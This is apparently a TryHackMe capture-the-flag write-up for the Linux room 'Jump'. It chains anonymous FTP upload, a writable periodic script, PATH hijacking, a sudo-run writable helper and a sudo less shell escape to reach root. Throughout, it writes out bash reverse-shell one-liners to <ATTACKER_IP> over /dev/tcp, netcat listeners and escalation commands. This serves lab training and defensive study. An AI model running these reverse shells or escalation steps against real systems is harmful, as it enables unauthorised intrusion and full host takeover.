---
type: writeup
platform: TryHackMe
room: Jump
os: Linux
environment: Linux Privilege Escalation
last_verified: 2026-09-28

techniques:
  - anonymous-ftp
  - writable-script
  - scheduled-execution
  - path-hijacking
  - sudo-abuse
  - writable-helper
  - tty-upgrade
  - shell-escape

tools:
  - nmap
  - ftp
  - netcat
  - systemctl
  - sudo
  - python3
  - less
---
**Attack path:** Anonymous FTP → automated script execution → `recon_user` → writable periodic script → `dev_user` → PATH hijacking → `monitor_user` → sudo + writable helper → `ops_user` → sudo `less` shell escape → root

## 1. Reconnaissance

Initial service enumeration:

```bash
nmap -sC -sV <TARGET_IP>
```

Relevant results:

```bash
21/tcp open  ftp  vsftpd 3.0.5
22/tcp open  ssh  OpenSSH

Anonymous FTP login allowed
incoming/ writable
pub/
```

Anonymous FTP access and a writable `incoming/` directory provided the first useful attack surface.

---

## 2. Anonymous FTP → `recon_user`

The FTP service accepted anonymous authentication:

```bash
ftp <TARGET_IP>
```

```bash
Name: anonymous
Password: [Enter]
```

The public files were enumerated:

```bash
ftp> ls -la
ftp> cd pub
ftp> ls -la
ftp> get README.txt
```

The README indicated that files placed in `incoming/` were processed automatically.

This created an important hypothesis:

> If attacker-controlled scripts uploaded to `incoming/` are executed by the processing pipeline, they can provide code execution under the identity running that pipeline.

A reverse-shell script was created locally:

```bash
cat > recon.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
EOF
```

A listener was started:

```bash
nc -lvnp 4444
```

The script was then uploaded:

```bash
ftp> cd incoming
ftp> put recon.sh
```

The processing pipeline executed the uploaded script and returned a reverse shell.

The resulting context was verified with:

```bash
whoami
id
```

The initial shell ran as:

```bash
recon_user
```

---

## 3. `recon_user` → `dev_user` — Writable Periodic Script

Local enumeration included:

```bash
whoami
id
pwd
ls -la
ls -la /home
sudo -l
```

The account belonged to groups that allowed access to resources owned by `dev_user`.

Enumeration under `/opt` revealed:

```bash
/opt/dev/backup.sh
```

Permissions showed:

```bash
owner: dev_user
group: dev_user
permissions: rwxrwxr-x
```

Because `recon_user` had group write access, the script could be modified.

Its original contents were:

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

A writable script alone does not establish privilege escalation. It also had to be shown that a more privileged identity executed it.

The obvious `cron` and `systemd` searches did not reveal the launcher directly, so the output file created by the script was observed instead:

```bash
stat /tmp/recon_backup.tgz
```

The archive was owned by:

```bash
dev_user:dev_user
```

Its modification time was then monitored:

```bash
for i in $(seq 1 30); do
  stat -c '%y | %U:%G | %s bytes' /tmp/recon_backup.tgz 2>/dev/null
  sleep 2
done
```

The file was recreated periodically while remaining owned by `dev_user`.

This established the privilege-escalation primitive:

```text
backup.sh writable by recon_user
+
backup.sh executed periodically as dev_user
=
code execution as dev_user
```

A new listener was started:

```bash
nc -lvnp 5555
```

The script was replaced with a reverse shell:

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"\n' > /opt/dev/backup.sh
```

The modification was verified:

```bash
cat /opt/dev/backup.sh
ls -l /opt/dev/backup.sh
```

When the periodic job ran again, a new shell connected back.

The new identity was verified:

```bash
whoami
id
```

```bash
dev_user
```

---

## 4. `dev_user` → `monitor_user` — PATH Hijacking

Process enumeration revealed a monitoring service:

```bash
ps aux | grep -E 'monitor|cron|script|backup'
```

A process was running as `monitor_user` through:

```bash
/bin/bash /usr/local/bin/healthcheck
```

The service definition was inspected:

```bash
systemctl cat healthcheck.service
```

Relevant configuration:

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The executed script contained:

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

The important detail was the use of:

```bash
ps
```

instead of an absolute path such as:

```bash
/usr/bin/ps
```

The service searched for executables according to:

```bash
/opt/dev/bin:/usr/local/bin:/usr/bin
```

Therefore `/opt/dev/bin/ps` would be selected before the legitimate `/usr/bin/ps`.

Because `dev_user` controlled `/opt/dev/bin/ps`, this created a **PATH hijacking** opportunity under the `monitor_user` context.

### Executable Permission Constraint

The malicious `ps` file was initially not executable.

Earlier, `recon_user` could write to it through group permissions but could not change its mode. Once operating as the actual owner, `dev_user`, the executable bit could be added:

```bash
chmod +x /opt/dev/bin/ps
```

A listener was started:

```bash
nc -lvnp 6666
```

The fake `ps` executable was replaced with a reverse shell:

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/6666 0>&1"\n' > /opt/dev/bin/ps

chmod +x /opt/dev/bin/ps
```

When `healthcheck` next executed `ps aux`, the attacker-controlled executable ran as `monitor_user`.

The new context was verified:

```bash
whoami
id
```

```bash
monitor_user
```

### Useful Failure — Inherited Malicious PATH

The new shell inherited the service's PATH:

```bash
/opt/dev/bin:/usr/local/bin:/usr/bin
```

Running:

```bash
ps
```

therefore executed the malicious `/opt/dev/bin/ps` again, creating additional reverse shells and making troubleshooting confusing.

The PATH was restored to safe system locations:

```bash
export PATH=/usr/local/bin:/usr/bin:/bin
which ps
```

Result:

```bash
/usr/bin/ps
```

---

## 5. `monitor_user` → `ops_user` — Sudo and Writable Helper

Sudo permissions were enumerated non-interactively:

```bash
sudo -n -l
```

The relevant rule was:

```bash
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

This allowed `monitor_user` to execute `deploy.sh` as `ops_user` without supplying a password.

The script was inspected:

```bash
cat /usr/local/bin/deploy.sh
```

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

The helper permissions were then checked:

```bash
ls -l /opt/app/deploy_helper.sh
```

The helper was owned by `monitor_user` and could be modified by that account.

The real privilege boundary was therefore not only the sudo-authorized script, but the full execution chain:

```text
monitor_user
    ↓
sudo NOPASSWD deploy.sh as ops_user
    ↓
deploy.sh executes ./deploy_helper.sh
    ↓
deploy_helper.sh controlled by monitor_user
    ↓
code execution as ops_user
```

An optional backup of the helper was created:

```bash
cp /opt/app/deploy_helper.sh /tmp/deploy_helper.sh.bak
```

A listener was started:

```bash
nc -lvnp 8888
```

The helper was replaced:

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/8888 0>&1"\n' > /opt/app/deploy_helper.sh
```

The trusted parent script was then executed through sudo:

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

The new shell identity was verified:

```bash
whoami
id
```

```bash
ops_user
```

This demonstrates why sudo analysis must include everything executed by the allowed command, not only the explicitly permitted binary or script.

---

## 6. `ops_user` → root — Sudo `less` Shell Escape

Sudo privileges were enumerated again:

```bash
sudo -n -l
```

Relevant result:

```bash
(root) NOPASSWD: /usr/bin/less
```

`ops_user` could therefore start `less` as root without a password.

`less` is an interactive pager and supports shell command execution from inside its interface:

```text
!<COMMAND>
```

For example:

```text
!/bin/bash
```

If `less` itself runs as root, the spawned shell inherits that privileged context.

### First Attempt — Missing TTY

The initial attempt was:

```bash
sudo /usr/bin/less /etc/hosts
```

From the reverse shell, `less` immediately exited instead of providing a usable interactive interface.

Entering:

```text
!/bin/bash
```

afterward was interpreted by the current shell rather than by `less`.

Earlier terminal messages indicated the underlying problem:

```bash
cannot set terminal process group
no job control in this shell
```

The reverse shell provided stdin/stdout but not a fully interactive TTY.

### TTY Upgrade

A pseudo-terminal was spawned:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
tty
```

A successful upgrade returned a pseudo-terminal similar to:

```bash
/dev/pts/0
```

`less` was launched again:

```bash
sudo /usr/bin/less /etc/hosts
```

Then, from inside the `less` interface:

```text
!/bin/bash
```

The resulting identity was verified:

```bash
whoami
id
```

```bash
root
uid=0(root)
```

Root access was achieved.

---

## Key Takeaways

- A writable file becomes a privilege-escalation primitive only when a more privileged identity actually executes or trusts it.
- When the scheduler is not immediately visible, filesystem ownership and timestamp changes can provide evidence of which identity executes a periodic script.
- PATH hijacking requires both an unsafe search path and control over an earlier executable location.
- A shell obtained through PATH hijacking may inherit the malicious PATH, causing attacker-created binaries to execute again unexpectedly.
- Sudo analysis must include the entire downstream execution chain. A protected parent script is still dangerous if it executes a helper controlled by the lower-privileged user.
- Interactive sudo escapes such as `less` may require a proper TTY; upgrading a reverse shell can therefore be necessary before exploitation works correctly.